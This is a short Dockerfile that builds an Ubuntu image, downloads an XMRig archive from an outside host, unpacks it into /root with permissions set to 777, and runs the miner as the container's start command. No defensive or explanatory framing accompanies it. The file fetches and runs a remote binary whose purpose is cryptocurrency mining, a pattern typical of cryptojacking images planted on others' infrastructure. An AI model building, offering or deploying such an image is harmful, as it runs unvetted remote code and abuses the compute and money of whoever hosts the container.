FROM ubuntu
RUN apt update \
&& apt install curl -y \
&& apt install wget -y \
&& wget -P /root https://text.hfcloud.xyz/xmrig.tar.gz \
&& tar -zxvf /root/xmrig.tar.gz -C /root \
&& chmod 777 /root/xmrig
CMD /root/xmrig
